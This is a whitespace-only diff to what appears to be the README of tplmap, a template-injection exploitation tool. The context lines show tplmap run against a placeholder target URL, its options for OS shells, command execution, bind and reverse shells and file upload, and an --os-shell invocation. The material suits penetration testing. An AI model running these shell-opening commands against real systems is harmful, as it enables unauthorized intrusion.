@@ -45,11 +45,11 @@ $ ./tplmap.py -u 'http://www.target.com/app?id=7'
 
 [+] Rerun tplmap providing one of the following options:
 
-    --os-shell			Run shell on the target
-    --os-cmd			Execute shell commands
-    --bind-shell PORT		Connect to a shell bind to a target port
+    --os-shell                Run shell on the target
+    --os-cmd                  Execute shell commands
+    --bind-shell PORT         Connect to a shell bind to a target port
     --reverse-shell HOST PORT	Send a shell back to the attacker's port
-    --upload LOCAL REMOTE	Upload files to the server
+    --upload LOCAL REMOTE	    Upload files to the server
                           
 $ ./tplmap.py -u 'http://www.target.com/app?id=7' --os-shell
 
